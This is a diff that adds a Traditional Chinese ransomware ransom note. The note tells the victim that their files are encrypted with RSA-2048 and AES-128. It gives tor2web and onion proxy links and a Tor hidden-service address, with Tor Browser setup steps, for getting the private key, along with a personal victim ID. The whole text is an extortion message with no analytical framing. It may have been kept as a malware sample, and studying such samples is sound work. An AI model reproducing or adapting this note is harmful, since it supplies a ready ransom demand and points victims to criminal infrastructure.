@@ -1,0 +1,20 @@
+﻿            !!!重要資訊 !!!!
+
+您的所有檔已被RSA-2048 和AES-128暗碼進行了加密。
+欲獲取更多關於RSA的資訊，請參閱：
+    http://zh.wikipedia.org/wiki/RSA加密演算法
+    http://zh.wikipedia.org/wiki/高级加密标准
+
+只有我們的機密伺服器上的私人金鑰和解密程式才能解密您的檔。
+如要接收您的私人金鑰，請點擊以下其中一個連結：
+    1. http://i3ezlvkoi7fwyood.tor2web.org/B2E0CCE469C43EDC
+    2. http://i3ezlvkoi7fwyood.onion.to/B2E0CCE469C43EDC
+    3. http://i3ezlvkoi7fwyood.onion.cab/B2E0CCE469C43EDC
+
+如果以上位址都無法打開，請按照以下步驟操作：
+    1. 下載並安裝洋蔥流覽器（Tor Browser）: https://www.torproject.org/download/download-easy.html
+    2.安裝成功後，運行流覽器，等待初始化。
+    3. 在位址欄輸入: i3ezlvkoi7fwyood.onion/B2E0CCE469C43EDC
+    4.按照網站上的說明進行操作。
+
+!!! 您的個人識別ID: B2E0CCE469C43EDC !!!
